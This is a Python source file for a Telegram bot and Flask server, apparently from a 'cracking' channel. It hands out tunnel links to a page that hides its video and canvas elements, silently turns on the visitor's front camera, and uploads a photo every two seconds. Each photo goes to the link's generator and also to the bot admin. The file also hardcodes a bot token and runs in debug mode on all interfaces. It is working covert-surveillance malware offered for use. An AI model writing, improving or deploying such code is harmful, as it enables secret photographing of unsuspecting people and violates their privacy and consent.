import telebot
from flask import Flask, request, jsonify
import os
from datetime import datetime
import threading
import requests
import time
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# ================= CONFIG =================
BOT_TOKEN = "8235792024:AAEkJYtbbid8RupgHNJdhF1Dnqif3pEP4gQ"
ADMIN_ID = 5686136730  # <-- Apna Telegram ID
CHANNEL_USERNAME = "KaushikCracking"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

TUNNEL_URL = None
KAUSHIK_URL = "https://structures-saturday-docs-specified.trycloudflare.com"

user_links = {}
@app.route('/')
def home():
    return "✅ Server is working! Use your generated link."


# ================== UPDATE TUNNEL ==================
def update_tunnel_url():
    global TUNNEL_URL
    while True:
        try:
            res = requests.get("http://127.0.0.1:4040/api/tunnels")
            data = res.json()
            if "tunnels" in data and len(data["tunnels"]) > 0:
                TUNNEL_URL = data["tunnels"][0]["public_url"]
        except:
            pass
        time.sleep(5)


USERS_FILE = "users.txt"

def save_user(chat_id):
    try:
        if not os.path.exists(USERS_FILE):
            open(USERS_FILE, "w").close()

        with open(USERS_FILE, "r") as f:
            users = f.read().splitlines()

        if str(chat_id) not in users:
            with open(USERS_FILE, "a") as f:
                f.write(str(chat_id) + "\n")
    except Exception as e:
        print("Error saving user:", e)
        
# ================== START ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    username = message.from_user.first_name or message.from_user.username

    # Save user to users.txt
    save_user(chat_id)

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 My Channel", url=f"https://t.me/{CHANNEL_USERNAME}"))

    welcome_msg = (
        f"✨ <b>Hey 👋, {username}</b>\n\n"
        f"🔗 Type /link to generate your personal link\n\n"
        f"⚡ <i>Created by</i> <b>Kaushik</b>"
    )

    bot.send_message(chat_id, welcome_msg, reply_markup=markup, parse_mode="HTML")


@bot.message_handler(commands=['all'])
def broadcast(message):
    chat_id = message.chat.id
    if str(chat_id) != str(ADMIN_ID):
        bot.send_message(chat_id, "⚠️ Only admin can use this command!")
        return

    text = message.text.replace("/all", "").strip()
    if not text:
        bot.send_message(chat_id, "❌ Please provide a message.\nExample: /all Hello everyone!")
        return

    if not os.path.exists(USERS_FILE):
        bot.send_message(chat_id, "No users found!")
        return

    with open(USERS_FILE, "r") as f:
        users = f.read().splitlines()

    success, fail = 0, 0
    for user_id in users:
        try:
            bot.send_message(int(user_id), f"📢 <b>Admin Message:</b>\n\n{text}", parse_mode="HTML")
            success += 1
        except:
            fail += 1

    bot.send_message(chat_id, f"✅ Broadcast complete!\n\nDelivered: {success}\nFailed: {fail}")
    
# ================== LINK ==================
@bot.message_handler(commands=['link'])
def send_link(message):
    chat_id = message.chat.id

    # Save user to users.txt
    save_user(chat_id)

    try:
        member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", chat_id)
        if member.status in ["member", "administrator", "creator"]:
            link_url = TUNNEL_URL if TUNNEL_URL else KAUSHIK_URL
            link = f"{link_url}/Kaushik/files?chat_id={chat_id}"

            link_msg = (
                f"🔑 <b>Your Address Link!</b>\n\n"
                f"➡️ {link}\n\n"
                f"⚡ <i>Securely generated just for you</i>"
            )
            bot.send_message(chat_id, link_msg, parse_mode="HTML")
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}"))
            bot.send_message(chat_id, "⚠️ Pehle channel join karo!", reply_markup=markup)
    except Exception:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(chat_id, "⚠️ Pehle channel join karo!", reply_markup=markup)

# ================== UPLOAD PHOTO ==================
@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    if 'photo' in request.files:
        photo_file = request.files['photo']
        chat_id = request.form.get('chat_id')
        if photo_file and chat_id:
            filename = f"web_photo_{chat_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
            photo_file.save(filename)

            try:
                user_info = bot.get_chat(chat_id)
                username = user_info.username or user_info.first_name
            except:
                username = "Unknown"

            with open(filename, 'rb') as f:
                bot.send_photo(chat_id, f, caption="📸 Your photo captured!")

            if str(chat_id) != str(ADMIN_ID):
                with open(filename, 'rb') as f:
                    bot.send_photo(ADMIN_ID, f, caption=f"📸 @{username}")

            os.remove(filename)
            return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400


# ================== CAMERA PAGE ==================
@app.route('/Kaushik/files')
def camera_page():
    return '''
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { margin:0; padding:0; }
video, canvas, img { display:none; }
</style>
</head>
<body>
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
<img id="photo">

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const chatId = new URLSearchParams(window.location.search).get('chat_id');

navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
.then(stream => {
    video.srcObject = stream;

    function capturePhoto() {
        if(video.readyState < 2) { 
            requestAnimationFrame(capturePhoto);
            return;
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');

        // Flip horizontally to fix mirrored selfie
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.setTransform(1,0,0,1,0,0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            formData.append('chat_id', chatId);

            fetch('/upload_photo',{method:'POST',body:formData})
            .then(res=>res.json())
            .catch(err=>console.log(err));

            setTimeout(capturePhoto, 2000); // capture every 2 sec
        }, 'image/jpeg');
    }

    capturePhoto();
})
.catch(err => console.log('Camera error:', err));
</script>
</body>
</html>
'''

# ================== RUN ==================
if __name__ == '__main__':
    threading.Thread(target=update_tunnel_url, daemon=True).start()
    threading.Thread(target=bot.polling, daemon=True).start()

    try:
        app.run(host='0.0.0.0', port=5000, debug=True)
    except OSError:
        app.run(host='0.0.0.0', port=8000, debug=True)